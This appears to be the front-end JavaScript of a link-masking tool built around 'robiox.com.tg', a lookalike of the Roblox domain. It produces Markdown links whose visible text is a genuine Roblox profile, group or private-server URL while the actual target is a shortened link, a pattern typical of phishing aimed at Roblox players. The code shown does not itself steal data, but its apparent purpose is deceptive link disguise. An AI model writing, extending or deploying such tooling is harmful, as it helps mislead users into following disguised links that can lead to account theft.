const input = document.getElementById("userLink");
const typeSelect = document.getElementById("linkType");
const resultDiv = document.getElementById("result");
const btn = document.getElementById("generateBtn");
const copyBtn = document.getElementById("copyBtn");
const viewBtn = document.getElementById("viewBtn");

btn.addEventListener("click", async () => {
  const link = input.value.trim();
  const type = typeSelect.value;
  const service = new URLSearchParams(window.location.search).get("service");

  if (!link) return alert("Please paste a link!");
  if (!service) return alert("No shortener selected!");

  // Transform Robiox links to Roblox
  let realLink = link;
  if (link.includes("robiox.com.tg")) {
    if (type === "profile") realLink = "https://www.roblox.com/users/435559589933/profile";
    else if (type === "group") realLink = "https://www.roblox.com/groups/2194003353";
    else if (type === "private") realLink = "https://www.roblox.com/share?code=80177c63cdc8614aa84be3cbd84b051a&type=Server";
  }

  try {
    const res = await fetch("/api/shorten", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ service, url: realLink })
    });
    const data = await res.json();
    if (data.error) throw new Error(data.error);

    // Show result with Roblox link + shortened link in paranteze
    const finalLink = `${type.toUpperCase()}-[${realLink}](${data.shortLink})`;
    resultDiv.innerText = finalLink;

    // Copy & view
    copyBtn.onclick = () => navigator.clipboard.writeText(finalLink);
    viewBtn.onclick = () => window.open(data.shortLink, "_blank");

  } catch (err) {
    console.error(err);
    resultDiv.innerText = "Error shortening the link";
  }
});
